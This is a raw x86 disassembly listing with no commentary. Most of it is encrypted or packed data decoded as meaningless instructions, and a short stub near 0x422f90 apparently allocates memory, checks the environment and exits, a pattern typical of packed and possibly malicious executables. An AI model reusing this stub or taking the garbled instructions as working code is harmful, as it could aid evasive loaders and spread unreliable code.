  422bd3:	imul   eax,ebp,0xf2ac8098
  422bd9:	into   
  422bda:	call   0x9ea55e8f
  422bdf:	leave  
  422be0:	adc    BYTE PTR [edi],dl
  422be2:	ja     0x422c12
  422be4:	push   0x7d
  422be6:	sbb    ebx,0x19
  422be9:	inc    ebp
  422bea:	cdq    
  422beb:	inc    ecx
  422bec:	cmp    cl,BYTE PTR [ebp-0x3550fe08]
  422bf2:	rcr    DWORD PTR [edi+0x23],1
  422bf5:	out    0xd4,al
  422bf7:	scas   eax,DWORD PTR es:[edi]
  422bf8:	js     0x422c2a
  422bfa:	xchg   ecx,eax
  422bfb:	lds    esp,FWORD PTR [esi+ebx*2-0x76]
  422bff:	arpl   WORD PTR [eax+0x7c],si
  422c02:	loope  0x422b96
  422c04:	cmp    esi,DWORD PTR [esi]
  422c06:	mov    edx,0x17d35812
  422c0b:	sar    DWORD PTR [ecx+0x68],0x90
  422c0f:	stos   DWORD PTR es:[edi],eax
  422c10:	das    
  422c11:	cs xor ebp,ecx
  422c14:	cdq    
  422c15:	sub    BYTE PTR [ecx-0x4c066b9e],dh
  422c1b:	jae    0x422c96
  422c1d:	je     0x422ba6
  422c1f:	(bad)  
  422c20:	sbb    ebx,DWORD PTR [ebx]
  422c22:	push   ebp
  422c23:	lahf   
  422c24:	popf   
  422c25:	pushf  
  422c26:	xor    edx,edi
  422c28:	and    al,0xcf
  422c2a:	cwde   
  422c2b:	aaa    
  422c2c:	cld    
  422c2d:	add    BYTE PTR [ecx+ecx*4],0x21
  422c31:	js     0x422bb7
  422c33:	cs stc 
  422c35:	adc    esi,DWORD PTR [ecx]
  422c37:	mov    eax,ds:0x12d8344
  422c3c:	imul   ebx,DWORD PTR [edi-0x76a680cb],0xeb1c3b8b
  422c46:	js     0x422bca
  422c48:	fdiv   DWORD PTR [eax-0x4dbfcced]
  422c4e:	fild   QWORD PTR [ecx]
  422c50:	out    dx,al
  422c51:	outs   dx,DWORD PTR ds:[esi]
  422c52:	mov    bl,0x82
  422c54:	outs   dx,DWORD PTR ds:[esi]
  422c55:	(bad)  
  422c56:	mov    edi,0x98c5ea1e
  422c5b:	and    DWORD PTR [esi-0x7b961994],edi
  422c61:	cmp    esp,DWORD PTR [ebx-0x76064c4e]
  422c67:	(bad)  
  422c68:	mov    bh,0xbb
  422c6a:	xchg   ebp,eax
  422c6b:	push   edx
  422c6c:	out    0x4b,eax
  422c6e:	mov    WORD PTR [esi-0x1c],?
  422c71:	add    eax,0x828e1c59
  422c76:	jg     0x422c27
  422c78:	in     eax,0x69
  422c7a:	and    BYTE PTR [ebp-0x1e646448],ch
  422c80:	xchg   ebx,eax
  422c81:	aad    0x7d
  422c83:	sbb    DWORD PTR [ecx-0x6a],ebx
  422c86:	int    0x64
  422c88:	fsubr  DWORD PTR [ecx+0x4f]
  422c8b:	pop    DWORD PTR [esi+0x78b345b1]
  422c91:	sbb    eax,0x9a9e7136
  422c96:	mov    cl,0xf3
  422c98:	fst    DWORD PTR [edx+0x2d]
  422c9b:	push   ecx
  422c9c:	call   0x4e767565
  422ca1:	jmp    0x2b5d:0xadc4a92f
  422ca8:	rcl    DWORD PTR [eax],0xfb
  422cab:	dec    BYTE PTR [ebp+eiz*2-0x2]
  422caf:	mov    eax,ds:0xeee5dde8
  422cb4:	enter  0xbd7d,0xe8
  422cb8:	pop    ss
  422cb9:	pusha  
  422cba:	stos   DWORD PTR es:[edi],eax
  422cbb:	xchg   esp,eax
  422cbc:	ja     0x422d1c
  422cbe:	and    ebp,eax
  422cc0:	adc    edx,ecx
  422cc2:	in     eax,0x1b
  422cc4:	mov    ebp,0xb3b0e258
  422cc9:	pop    ds
  422cca:	sub    cl,BYTE PTR [ebp-0x141edf1c]
  422cd0:	icebp  
  422cd1:	clc    
  422cd2:	push   es
  422cd3:	push   esp
  422cd4:	adc    edi,ebx
  422cd6:	and    ebx,DWORD PTR [ebp+eiz*8-0xa]
  422cda:	dec    edx
  422cdb:	les    esi,FWORD PTR [ecx-0x453573f6]
  422ce1:	neg    DWORD PTR [eax]
  422ce3:	push   ebx
  422ce4:	dec    eax
  422ce5:	mov    bl,0x8c
  422ce7:	sub    ecx,ebx
  422ce9:	shl    BYTE PTR [esi-0x62a34c48],0x15
  422cf0:	cmp    dl,BYTE PTR [esi+0x3d]
  422cf3:	xchg   ebx,eax
  422cf4:	nop
  422cf5:	jecxz  0x422d3f
  422cf7:	jno    0x422d42
  422cf9:	xchg   ebx,eax
  422cfa:	call   0x6007:0x4b59a79e
  422d01:	xlat   BYTE PTR ds:[ebx]
  422d02:	xor    esi,ebx
  422d04:	push   ecx
  422d05:	out    dx,al
  422d06:	or     BYTE PTR [ecx],bh
  422d08:	pop    edx
  422d09:	push   eax
  422d0a:	mov    edi,DWORD PTR [ebp-0x55296b20]
  422d10:	mov    cs,WORD PTR [ebx]
  422d12:	lods   eax,DWORD PTR ds:[esi]
  422d13:	pop    edi
  422d14:	jno    0x422d38
  422d16:	clc    
  422d17:	pusha  
  422d18:	xlat   BYTE PTR ds:[ebx]
  422d19:	shl    DWORD PTR [eax-0x6d],0xac
  422d1d:	or     eax,edx
  422d1f:	lods   al,BYTE PTR ds:[esi]
  422d20:	(bad)  
  422d22:	stc    
  422d23:	icebp  
  422d24:	or     bh,BYTE PTR [eax-0xbadf750]
  422d2a:	adc    BYTE PTR [edi-0x79],ch
  422d2d:	fnstenv [eax+ebp*2]
  422d30:	pop    es
  422d31:	call   0xa9ff9e15
  422d36:	aaa    
  422d37:	repnz push ecx
  422d39:	cwde   
  422d3a:	xor    DWORD PTR [edi],0x55
  422d3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d3e:	sub    al,BYTE PTR [ebp+0x14]
  422d41:	lea    ebp,[edi-0x77]
  422d44:	inc    esi
  422d45:	and    BYTE PTR [ecx-0x43],al
  422d48:	fadd   QWORD PTR [edx+0x59]
  422d4b:	cmp    eax,DWORD PTR [edi]
  422d4d:	mov    edx,0x2de65083
  422d52:	rcr    ch,1
  422d54:	inc    esi
  422d55:	add    bl,BYTE PTR [bp+si+0x61]
  422d59:	jno    0x422dad
  422d5b:	push   esp
  422d5c:	jmp    0x422d42
  422d5e:	xor    esp,DWORD PTR [eax+eax*2]
  422d61:	das    
  422d62:	aas    
  422d63:	sbb    dh,cl
  422d65:	in     al,dx
  422d66:	hlt    
  422d67:	cs in  eax,0x4a
  422d6a:	daa    
  422d6b:	sar    eax,1
  422d6d:	sti    
  422d6e:	lock or DWORD PTR [esi+0x72b2f6a2],eax
  422d75:	xchg   esi,eax
  422d76:	shl    DWORD PTR [ebp-0x78],1
  422d79:	push   edi
  422d7a:	loop   0x422d2e
  422d7c:	out    dx,al
  422d7d:	mov    esp,0xbb5198a0
  422d82:	adc    ch,dh
  422d84:	popf   
  422d85:	mov    WORD PTR [ecx],ss
  422d87:	in     eax,dx
  422d88:	xchg   esp,eax
  422d89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d8a:	fs jl  0x422de8
  422d8d:	stos   BYTE PTR es:[edi],al
  422d8e:	xchg   ebp,eax
  422d8f:	fucomi st,st(4)
  422d91:	inc    eax
  422d92:	int3   
  422d93:	jmp    0x4da16019
  422d98:	mov    edi,0x2f778fa8
  422d9d:	jecxz  0x422e16
  422d9f:	and    ecx,ebx
  422da1:	sbb    ch,bh
  422da3:	and    eax,0xe56ad007
  422da8:	shr    eax,0x65
  422dab:	mov    esp,0x6f7fa923
  422db0:	jmp    0x422e02
  422db2:	ja     0x422db6
  422db4:	pop    ebx
  422db5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422db6:	and    al,dh
  422db8:	fs adc al,0xe0
  422dbb:	(bad)  
  422dbc:	scas   al,BYTE PTR es:[edi]
  422dbd:	cwde   
  422dbe:	push   edx
  422dbf:	dec    esi
  422dc0:	outs   dx,BYTE PTR ds:[esi]
  422dc1:	sub    BYTE PTR [edi],0x32
  422dc4:	hlt    
  422dc5:	mov    bh,0x3c
  422dc7:	fwait
  422dc8:	stos   DWORD PTR es:[edi],eax
  422dc9:	mov    ebx,0x2205ab00
  422dce:	mov    ebp,0xbab42ab
  422dd3:	xor    eax,ebp
  422dd5:	hlt    
  422dd6:	aad    0xea
  422dd8:	retf   0x4b29
  422ddb:	dec    edx
  422ddc:	sbb    eax,0x753515d5
  422de1:	popa   
  422de2:	xchg   esp,eax
  422de3:	ficomp WORD PTR [ebp-0x5a]
  422de6:	scas   al,BYTE PTR es:[edi]
  422de7:	and    bl,BYTE PTR ds:0xa89f25d6
  422ded:	jns    0x422d77
  422def:	cmp    al,0x93
  422df1:	or     dh,dh
  422df3:	outs   dx,BYTE PTR ds:[esi]
  422df4:	push   ds
  422df5:	(bad)  
  422df6:	cmp    DWORD PTR gs:[edx-0x7b83bf86],edi
  422dfd:	sub    eax,0x2eaa168d
  422e02:	fldl2t 
  422e04:	jne    0x422e05
  422e06:	dec    esi
  422e07:	div    DWORD PTR [eax-0x50]
  422e0a:	xchg   ecx,eax
  422e0b:	rol    BYTE PTR [edi],cl
  422e0d:	inc    eax
  422e0e:	retf   0x372b
  422e11:	(bad)  
  422e12:	popf   
  422e13:	rcr    eax,0xb6
  422e16:	call   0x79381fd4
  422e1b:	adc    al,0x40
  422e1d:	fistp  QWORD PTR [ebx-0x65]
  422e20:	or     ecx,0xffffffd3
  422e23:	lods   eax,DWORD PTR ds:[esi]
  422e24:	xchg   edx,eax
  422e25:	mov    eax,ds:0x9a00cda
  422e2a:	sub    eax,0xca0b4a0c
  422e2f:	cli    
  422e30:	add    DWORD PTR [eax+0xf8b98bb],ecx
  422e36:	leave  
  422e37:	iret   
  422e38:	cdq    
  422e39:	das    
  422e3a:	xor    BYTE PTR [ebx],0xf9
  422e3d:	jno    0x422e39
  422e3f:	mov    ebx,0xf17f7bce
  422e44:	mov    dl,ch
  422e46:	ins    BYTE PTR es:[edi],dx
  422e47:	in     al,dx
  422e48:	test   ax,0xbd55
  422e4c:	sub    cl,al
  422e4e:	and    ah,BYTE PTR [ebp-0x2b0f8eb5]
  422e54:	inc    ebp
  422e55:	leave  
  422e56:	sub    ebp,DWORD PTR [ecx-0x5d22fe0b]
  422e5c:	ret    
  422e5d:	or     DWORD PTR [ecx+0x423564fa],eax
  422e63:	inc    ecx
  422e64:	mov    cl,0x3d
  422e66:	nop
  422e67:	in     eax,0x55
  422e69:	ss into 
  422e6b:	jmp    0xe95fdbd6
  422e70:	sub    BYTE PTR [ecx-0x9477bdd],dh
  422e76:	adc    eax,0x50299f36
  422e7b:	test   eax,0x3ed15ce3
  422e80:	int    0xe5
  422e82:	scas   al,BYTE PTR es:[edi]
  422e83:	sub    DWORD PTR [edx],ebx
  422e85:	lock lods al,BYTE PTR ds:[esi]
  422e87:	call   0xd7e0:0x1b90e62
  422e8e:	cmp    eax,0xd531e0a4
  422e93:	mov    eax,0x877bc0f9
  422e98:	(bad)  
  422e9a:	and    eax,0x8433c3de
  422e9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ea0:	or     edx,esi
  422ea2:	(bad)  
  422ea3:	xor    al,bl
  422ea5:	jno    0x422eb9
  422ea7:	retf   0x2726
  422eaa:	push   ebp
  422eab:	shl    BYTE PTR [edi-0x57],0x7
  422eaf:	pop    edx
  422eb0:	push   0xffffff9a
  422eb2:	rcr    edx,cl
  422eb4:	ja     0x422ee1
  422eb6:	mov    edi,0xcdaaf3c4
  422ebb:	push   ss
  422ebc:	das    
  422ebd:	cwde   
  422ebe:	adc    al,0x63
  422ec0:	aam    0xe2
  422ec2:	and    BYTE PTR [edi+0xd6f9ada],bl
  422ec8:	pop    edx
  422ec9:	jno    0x422ea8
  422ecb:	and    al,0x27
  422ecd:	pop    ecx
  422ece:	daa    
  422ecf:	cmp    BYTE PTR [edx+0x32dd6ba2],0xee
  422ed6:	mov    ch,0xb
  422ed8:	sbb    eax,0x3e942029
  422edd:	int    0xb0
  422edf:	inc    ebx
  422ee0:	retf   0xd633
  422ee3:	jle    0x422e69
  422ee5:	mov    esi,0x137b32c0
  422eea:	push   edx
  422eeb:	gs dec ebx
  422eed:	imul   edx,DWORD PTR [ebp+0x35],0x462d03ae
  422ef4:	fs sti 
  422ef6:	pop    ds
  422ef7:	jecxz  0x422eba
  422ef9:	pop    ebp
  422efa:	(bad)  
  422efb:	call   0xd0ebaa05
  422f00:	and    al,0xa6
  422f02:	dec    esi
  422f03:	xchg   esp,eax
  422f04:	pop    ss
  422f05:	(bad)  
  422f06:	mov    eax,ds:0x2bf190fd
  422f0b:	push   eax
  422f0c:	adc    BYTE PTR [eax-0x3a],ch
  422f0f:	mov    dl,0xae
  422f11:	push   es
  422f12:	enter  0xeae0,0x55
  422f16:	and    al,0x55
  422f18:	jp     0x422f56
  422f1a:	lods   eax,DWORD PTR ds:[esi]
  422f1b:	fucom  st(0)
  422f1d:	jecxz  0x422f53
  422f1f:	call   0x45721623
  422f24:	xchg   ebp,eax
  422f25:	or     al,0xdc
  422f27:	rol    ebx,0xdb
  422f2a:	inc    edx
  422f2b:	fcmovnu st,st(5)
  422f2d:	pop    ebp
  422f2e:	imul   esp,DWORD PTR [eax-0x5188d17a],0xffffffce
  422f35:	push   eax
  422f36:	sub    esp,edi
  422f38:	ins    DWORD PTR es:[edi],dx
  422f39:	and    dh,bl
  422f3b:	add    al,0x61
  422f3d:	cmc    
  422f3e:	jnp    0x422ec3
  422f40:	out    0x96,al
  422f42:	jmp    0x422ede
  422f44:	jmp    0x422eea
  422f46:	mov    eax,ds:0x92dbc3bf
  422f4b:	sub    ebp,edi
  422f4d:	adc    BYTE PTR [eax],bh
  422f4f:	lods   eax,DWORD PTR ds:[esi]
  422f50:	call   0x2fab:0x4d6ca55f
  422f57:	dec    edx
  422f58:	and    ebp,DWORD PTR [edx-0x13]
  422f5b:	out    dx,eax
  422f5c:	sbb    DWORD PTR [ebx],edx
  422f5e:	and    BYTE PTR [edi+0x2d2f8f2c],ch
  422f64:	aas    
  422f65:	loop   0x422fe5
  422f67:	iret   
  422f68:	outs   dx,DWORD PTR ds:[esi]
  422f69:	inc    eax
  422f6a:	pop    es
  422f6b:	cs push es
  422f6d:	adc    al,0x9c
  422f6f:	neg    DWORD PTR [edi+0x19ab8603]
  422f75:	jmp    0x1b8:0x16c1cca
  422f7c:	add    BYTE PTR [eax],al
  422f7e:	add    BYTE PTR [ebx-0x333ca21b],cl
  422f84:	int3   
  422f85:	int3   
  422f86:	int3   
  422f87:	int3   
  422f88:	int3   
  422f89:	int3   
  422f8a:	int3   
  422f8b:	int3   
  422f8c:	int3   
  422f8d:	int3   
  422f8e:	int3   
  422f8f:	int3   
  422f90:	push   ebp
  422f91:	mov    ebp,esp
  422f93:	sub    esp,0x8
  422f96:	push   esi
  422f97:	push   0x0
  422f99:	mov    DWORD PTR [ebp-0x4],0x0
  422fa0:	call   DWORD PTR ds:0x42905c
  422fa6:	mov    esi,DWORD PTR ds:0x429030
  422fac:	push   0x4
  422fae:	push   0x1000
  422fb3:	push   0x4cf
  422fb8:	push   0x1000
  422fbd:	mov    DWORD PTR [ebp-0x8],esi
  422fc0:	call   DWORD PTR ds:0x429058
  422fc6:	test   esi,esi
  422fc8:	jne    0x422fd2
  422fca:	push   esi
  422fcb:	push   esi
  422fcc:	call   DWORD PTR ds:0x429014
  422fd2:	push   0xa
  422fd4:	push   0x0
  422fd6:	push   0x0
  422fd8:	call   DWORD PTR ds:0x429054
  422fde:	push   0x0
  422fe0:	push   0x4e
  422fe2:	push   0x1e
  422fe4:	push   0x0
  422fe6:	push   0xffffffff
  422fe8:	call   DWORD PTR ds:0x429088
  422fee:	test   eax,eax
  422ff0:	je     0x422ffa
  422ff2:	push   0x0
  422ff4:	call   DWORD PTR ds:0x42904c
  422ffa:	mov    esi,DWORD PTR [ebp-0x8]
  422ffd:	call   esi
  422fff:	mov    DWORD PTR [ebp-0x4],eax
  423002:	cmp    DWORD PTR [ebp-0x4],0x57
  423006:	jne    0x42301d
  423008:	push   0x2b937fac
  42300d:	call   0x4111f0
  423012:	add    esp,0x4
  423015:	push   0x0
  423017:	call   DWORD PTR ds:0x429048
  42301d:	push   0x0
  42301f:	call   DWORD PTR ds:0x429044
  423025:	xor    eax,eax
  423027:	pop    esi
  423028:	mov    esp,ebp
  42302a:	pop    ebp
  42302b:	ret    
  42302c:	nop
  42302d:	nop
  42302e:	nop
  42302f:	nop
  423030:	sub    esp,0x10
  423033:	push   esi
  423034:	mov    esi,DWORD PTR ds:0x42915c
  42303a:	push   0x5
  42303c:	push   0x0
  42303e:	call   esi
  423040:	push   0x5
  423042:	push   0x0
  423044:	call   esi
  423046:	push   0x0
  423048:	push   0x0
  42304a:	push   0x0
  42304c:	call   DWORD PTR ds:0x429040
  423052:	lea    eax,[esp+0x4]
  423056:	push   eax
  423057:	call   DWORD PTR ds:0x429068
  42305d:	call   DWORD PTR ds:0x429064
  423063:	cmp    WORD PTR [esp+0x4],0x0
  423069:	pop    esi
  42306a:	push   0x0
  42306c:	je     0x42308f
  42306e:	push   0x0
  423070:	push   0x100000
  423075:	call   DWORD PTR ds:0x429060
  42307b:	push   0x0
  42307d:	call   0x422f90
  423082:	add    esp,0x4
  423085:	call   0x411000
  42308a:	jmp    0x4244c4
  42308f:	push   0x3d
  423091:	push   0x20
  423093:	call   0x4244f6
  423098:	inc    DWORD PTR [ecx+0x21]
  42309b:	retf   0xc740
  42309e:	fucomi st,st(1)
  4230a0:	xchg   edi,eax
  4230a1:	iret   
  4230a2:	or     BYTE PTR [esi],ah
  4230a4:	jle    0x4230b7
  4230a6:	repz jnp 0x423103
  4230a9:	clc    
  4230aa:	(bad)  
  4230ab:	fucomi st,st(1)
  4230ad:	xchg   edi,eax
  4230ae:	retf   
  4230af:	or     BYTE PTR [esi],ah
  4230b1:	ds out dx,al
  4230b3:	or     al,0x7b
  4230b5:	pop    edx
  4230b6:	inc    eax
  4230b7:	(bad)  
  4230b8:	fucomi st,st(1)
  4230ba:	xchg   edi,eax
  4230bb:	retf   
  4230bc:	or     BYTE PTR [esi],ah
  4230be:	jle    0x4230ae
  4230c0:	or     al,0x7b
  4230c2:	pop    edx
  4230c3:	inc    eax
  4230c4:	(bad)  
  4230c5:	fucomi st,st(1)
  4230c7:	xchg   edi,eax
  4230c8:	retf   
  4230c9:	or     BYTE PTR [esi],ah
  4230cb:	jle    0x4230bb
  4230cd:	or     al,0x7b
  4230cf:	pop    edx
  4230d0:	inc    eax
  4230d1:	(bad)  
  4230d2:	fucomi st,st(1)
  4230d4:	xchg   edi,eax
  4230d5:	xor    ecx,DWORD PTR [eax]
  4230d7:	es jle 0x4230ba
  4230da:	adc    eax,ecx
  4230dc:	push   esp
  4230dd:	inc    eax
  4230de:	jo     0x4230b2
  4230e0:	and    al,0xb6
  4230e2:	jae    0x4230ed
  4230e4:	push   0xffffffb3
  4230e6:	iret   
  4230e7:	pop    eax
  4230e8:	adc    esi,DWORD PTR [ebx]
  4230ea:	xor    esp,esp
  4230ec:	stos   DWORD PTR es:[edi],eax
  4230ed:	fwait
  4230ee:	clc    
  4230ef:	lods   al,BYTE PTR ds:[esi]
  4230f0:	jp     0x423139
  4230f2:	adc    ecx,esi
  4230f4:	outs   dx,DWORD PTR ds:[esi]
  4230f5:	sbb    dh,BYTE PTR [esi+ebp*1]
  4230f8:	stos   DWORD PTR es:[edi],eax
  4230f9:	scas   eax,DWORD PTR es:[edi]
  4230fa:	leave  
  4230fb:	cmc    
  4230fc:	scas   al,BYTE PTR es:[edi]
  4230fd:	sub    BYTE PTR [ebx+ecx*1-0x80],dl
  423101:	sub    al,0x12
  423103:	xor    al,0x60
  423105:	adc    BYTE PTR [edx+edi*4+0x4267a6b7],0x1b
  42310d:	rol    BYTE PTR [ecx],0x76
  423110:	push   eax
  423111:	fs (bad) 
  423113:	fucomi st,st(1)
  423115:	xchg   edi,eax
  423116:	retf   
  423117:	or     BYTE PTR [esi],ah
  423119:	jns    0x423192
  42311b:	lock and bl,BYTE PTR [ecx]
  42311e:	mov    eax,0x6faad156
  423123:	pop    ecx
  423124:	add    ah,BYTE PTR [ebp-0x7a]
  423127:	jl     0x42312f
  423129:	and    edi,DWORD PTR [edi]
  42312b:	dec    esp
  42312c:	into   
  42312d:	test   BYTE PTR [ecx],dl
  42312f:	add    eax,0x464350c1
  423134:	in     al,0xce
  423136:	or     eax,0x4a
  423139:	pushf  
  42313a:	mov    esi,0xf0a39dd0
  42313f:	mov    ah,0x74
  423141:	ret    0x4282
  423144:	push   eax
  423145:	push   es
  423146:	cmp    al,0x49
  423148:	jecxz  0x423127
  42314a:	dec    ebx
  42314b:	sbb    DWORD PTR [esp+esi*1],ebp
  42314e:	push   ss
  42314f:	sahf   
  423150:	jno    0x423162
  423152:	rol    ch,0xd1
  423155:	mov    cl,0x6f
  423157:	pop    ecx
  423158:	add    ah,BYTE PTR [ebp-0x7a]
  42315b:	jge    0x423163
  42315d:	push   ebx
  42315e:	mov    ds:0x3164ced2,eax
  423163:	pop    ss
  423164:	rol    DWORD PTR [ebp-0x22],0xec
  423168:	in     al,0x54
  42316a:	push   ds
  42316b:	addr16 dec edx
  42316d:	int3   
  42316e:	and    edi,DWORD PTR [ebx-0x63]
  423171:	xchg   ebx,eax
  423172:	ins    DWORD PTR es:[edi],dx
  423173:	cs je  0x423122
  423176:	hlt    
  423177:	jmp    0xd4e349cc
  42317c:	jecxz  0x423153
  42317e:	xor    ebx,DWORD PTR [edx+0x6f872c2c]
  423184:	adc    ebx,DWORD PTR [ecx]
  423186:	mov    eax,0x97e9d156
  42318b:	retf   
  42318c:	or     BYTE PTR [esi],ah
  42318e:	jle    0x42317e
  423190:	or     al,0x2b
  423192:	pop    ds
  423193:	inc    eax
  423194:	les    edx,FWORD PTR [edi-0x1b346a18]
  42319a:	lds    esp,FWORD PTR [ecx]
  42319c:	mov    eax,ds:0x405a7b0c
  4231a1:	(bad)  
  4231a2:	fucomi st,st(1)
  4231a4:	xchg   edi,eax
  4231a5:	sub    ecx,DWORD PTR [eax]
  4231a7:	and    eax,0x710de57f
  4231ac:	pop    edx
  4231ad:	inc    eax
  4231ae:	sub    bh,bl
  4231b0:	jmp    0x2651014c
  4231b5:	jle    0x4231a5
  4231b7:	or     al,0x7b
  4231b9:	pop    ebx
  4231ba:	std    
  4231bb:	(bad)  
  4231bc:	fucomi st,st(1)
  4231be:	xchg   ebx,ecx
  4231c0:	or     BYTE PTR [esi],ah
  4231c2:	jle    0x4231af
  4231c4:	or     al,0x7b
  4231c6:	pop    edx
  4231c7:	add    esp,eax
  4231c9:	(bad)  
  4231cb:	xchg   edi,eax
  4231cc:	retf   
  4231cd:	or     BYTE PTR [esi+edi*2],ah
  4231d0:	out    dx,al
  4231d1:	or     DWORD PTR [ebx+0x5b],edi
  4231d4:	inc    eax
  4231d5:	(bad)  
  4231d6:	fucomi st,st(1)
  4231d8:	xchg   edi,eax
  4231d9:	into   
  4231da:	or     BYTE PTR [edi],ah
  4231dc:	jle    0x4231cc
  4231de:	or     al,0x7b
  4231e0:	pop    edx
  4231e1:	inc    eax
  4231e2:	inc    esp
  4231e3:	shr    cl,1
  4231e5:	xchg   edi,eax
  4231e6:	iret   
  4231e7:	or     BYTE PTR [esi],ah
  4231e9:	ret    
  4231ea:	fisttp WORD PTR [ecx]
  4231ec:	jnp    0x423246
  4231ee:	inc    eax
  4231ef:	les    ebx,FWORD PTR [ebx-0x17]
  4231f2:	xchg   edi,eax
  4231f3:	fisttp DWORD PTR [eax]
  4231f5:	outs   dx,BYTE PTR es:[esi]
  4231f7:	out    dx,al
  4231f8:	or     al,0x7b
  4231fa:	pop    edx
  4231fb:	push   eax
  4231fc:	(bad)  
  4231fd:	(bad)  
  4231ff:	xchg   edi,eax
  423200:	retf   
  423201:	or     BYTE PTR [esi],ah
  423203:	jle    0x4231f3
  423205:	sbb    al,0x7b
  423207:	pop    edx
  423208:	inc    eax
  423209:	(bad)  
  42320a:	fucomi st,st(1)
  42320c:	xchg   edi,eax
  42320d:	retf   
  42320e:	or     BYTE PTR [esi],ah
  423210:	jle    0x42327c
  423212:	bound  esi,QWORD PTR [eax+0x5a]
  423215:	sub    edi,eax
  423217:	fucomi st,st(1)
  423219:	xchg   edi,eax
  42321a:	sti    
  42321b:	add    esp,DWORD PTR [esi]
  42321d:	mov    cl,0xd3
  42321f:	or     al,0x7b
  423221:	pop    edx
  423222:	inc    eax
  423223:	(bad)  
  423224:	fucomi st,st(1)
  423226:	xchg   edi,eax
  423227:	retf   
  423228:	or     BYTE PTR [esi],ah
  42322a:	jle    0x42321a
  42322c:	or     al,0x7b
  42322e:	pop    edx
  42322f:	inc    eax
  423230:	(bad)  
  423231:	fucomi st,st(1)
  423233:	xchg   edi,eax
  423234:	retf   
  423235:	or     BYTE PTR [esi],ah
  423237:	jle    0x423227
  423239:	or     al,0x7b
  42323b:	pop    edx
  42323c:	inc    eax
  42323d:	(bad)  
  42323e:	fucomi st,st(1)
  423240:	xchg   edi,eax
  423241:	retf   
  423242:	or     BYTE PTR [esi],ah
  423244:	jle    0x423234
  423246:	or     al,0x7b
  423248:	pop    edx
  423249:	inc    eax
  42324a:	(bad)  
  42324b:	fucomi st,st(1)
  42324d:	xchg   edi,eax
  42324e:	retf   
  42324f:	or     BYTE PTR [esi],ah
  423251:	jle    0x423241
  423253:	or     al,0x7b
  423255:	pop    edx
  423256:	inc    eax
  423257:	(bad)  
  423258:	fucomi st,st(1)
  42325a:	xchg   edi,eax
  42325b:	retf   
  42325c:	or     BYTE PTR [esi],ah
  42325e:	jle    0x42324e
  423260:	or     al,0x7b
  423262:	pop    edx
  423263:	inc    eax
  423264:	(bad)  
  423265:	fucomi st,st(1)
  423267:	xchg   edi,eax
  423268:	retf   
  423269:	or     BYTE PTR [esi],ah
  42326b:	jle    0x42325b
  42326d:	or     al,0x7b
  42326f:	pop    edx
  423270:	inc    eax
  423271:	(bad)  
  423272:	fucomi st,st(1)
  423274:	xchg   edi,eax
  423275:	retf   
  423276:	or     BYTE PTR [esi],ah
  423278:	jle    0x423268
  42327a:	or     al,0x7b
  42327c:	pop    edx
  42327d:	inc    eax
  42327e:	(bad)  
  42327f:	fucomi st,st(1)
  423281:	xchg   edi,eax
  423282:	retf   
  423283:	or     BYTE PTR [esi],ah
  423285:	jle    0x423275
  423287:	or     al,0x7b
  423289:	je     0x4232bf
  42328b:	mov    eax,ds:0xcb979da3
  423290:	or     BYTE PTR [esi],ah
  423292:	pop    esi
  423293:	in     eax,0xc
  423295:	jnp    0x4232e1
  423297:	inc    eax
  423298:	(bad)  
  423299:	fcmovnbe st,st(3)
  42329b:	xchg   ebx,eax
  42329c:	retf   
  42329d:	or     BYTE PTR [edx],ah
  42329f:	jle    0x42328f
  4232a1:	pop    esp
  4232a2:	sbb    DWORD PTR ds:[edx-0x70],esi
  4232a6:	xchg   esp,eax
  4232a7:	jmp    0x264afe43
  4232ac:	jle    0x42327c
  4232ae:	or     al,0x7b
  4232b0:	mov    edx,0x9ba8b66e
  4232b5:	hlt    
  4232b6:	retf   
  4232b7:	or     BYTE PTR [esi],ah
  4232b9:	jle    0x423279
  4232bb:	or     al,0x7b
  4232bd:	pop    edx
  4232be:	jo     0x42328f
  4232c0:	fucomi st,st(1)
  4232c2:	(bad)  
  4232c3:	retf   
  4232c4:	or     BYTE PTR [esi],ah
  4232c6:	inc    eax
  4232c7:	jmp    0xdbc4:0x405a7b0c
  4232ce:	jmp    0x264afe6a
  4232d3:	jle    0x4232c3
  4232d5:	sub    al,0x7b
  4232d7:	pop    edx
  4232d8:	mov    al,ds:0x97e9dbc4
  4232dd:	retf   
  4232de:	or     BYTE PTR [esi],ah
  4232e0:	jle    0x4232d0
  4232e2:	or     al,0x7b
  4232e4:	pop    edx
  4232e5:	inc    eax
  4232e6:	(bad)  
  4232e7:	fucomi st,st(1)
  4232e9:	xchg   edi,eax
  4232ea:	retf   
  4232eb:	or     BYTE PTR [esi],ah
  4232ed:	jle    0x4232dd
  4232ef:	or     al,0x7b
  4232f1:	pop    edx
  4232f2:	inc    eax
  4232f3:	(bad)  
  4232f4:	fucomi st,st(1)
  4232f6:	xchg   edi,eax
  4232f7:	retf   
  4232f8:	or     BYTE PTR [esi],ah
  4232fa:	jle    0x4232ea
  4232fc:	or     al,0x7b
  4232fe:	pop    edx
  4232ff:	inc    eax
  423300:	(bad)  
  423301:	fucomi st,st(1)
  423303:	xchg   edi,eax
  423304:	retf   
  423305:	or     BYTE PTR [esi],ah
  423307:	jle    0x4232f7
  423309:	or     al,0x7b
  42330b:	pop    edx
  42330c:	inc    eax
  42330d:	(bad)  
  42330e:	fucomi st,st(1)
  423310:	xchg   edi,eax
  423311:	retf   
  423312:	or     BYTE PTR [esi],ah
  423314:	jle    0x423304
  423316:	or     al,0x7b
  423318:	pop    edx
  423319:	inc    eax
  42331a:	(bad)  
  42331b:	fucomi st,st(1)
  42331d:	xchg   edi,eax
  42331e:	retf   
  42331f:	or     BYTE PTR [esi],ah
  423321:	jle    0x423311
  423323:	or     al,0x7b
  423325:	pop    edx
  423326:	inc    eax
  423327:	(bad)  
  423328:	fucomi st,st(1)
  42332a:	xchg   edi,eax
  42332b:	retf   
  42332c:	or     BYTE PTR [esi],ah
  42332e:	jle    0x42331e
  423330:	or     al,0x7b
  423332:	pop    edx
  423333:	inc    eax
  423334:	(bad)  
  423335:	fucomi st,st(1)
  423337:	xchg   edi,eax
  423338:	retf   
  423339:	or     BYTE PTR [esi],ah
  42333b:	jle    0x42332b
  42333d:	or     al,0x7b
  42333f:	pop    edx
  423340:	inc    eax
  423341:	(bad)  
  423342:	fucomi st,st(1)
  423344:	xchg   edi,eax
  423345:	retf   
